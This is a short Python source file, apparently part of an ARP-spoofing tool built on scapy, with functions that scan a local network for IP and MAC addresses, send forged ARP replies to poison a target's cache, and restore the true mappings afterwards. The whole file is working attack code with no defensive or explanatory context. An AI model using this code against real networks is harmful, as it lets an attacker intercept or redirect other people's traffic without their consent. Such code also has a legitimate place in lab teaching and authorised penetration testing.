import scapy.all as scapy

def get_devices(ip: str):
    devices = []
    pck = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = ip)
    
    res = scapy.srp(
            pck,
            timeout = 3,
            verbose = 0
    )[0]
    
    for _, rcv in res:
        devices.append({
            'ip'     : rcv.psrc,
            'mac'    : rcv.hwsrc,
    })
    return devices

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target: str, host: str, hwtarget: str) -> None:
    pck = scapy.ARP(op=2, pdst = target, hwdst = hwtarget, psrc = host )
    scapy.send(pck, verbose = False)

def restore(src: str, dst: str, hwdst: str, hwsrc: str) -> None:

    pck = scapy.ARP(op = 2, pdst = dst, hwdst = hwdst, psrc = src, hwsrc = hwsrc)
    scapy.send(pck, verbose = False)



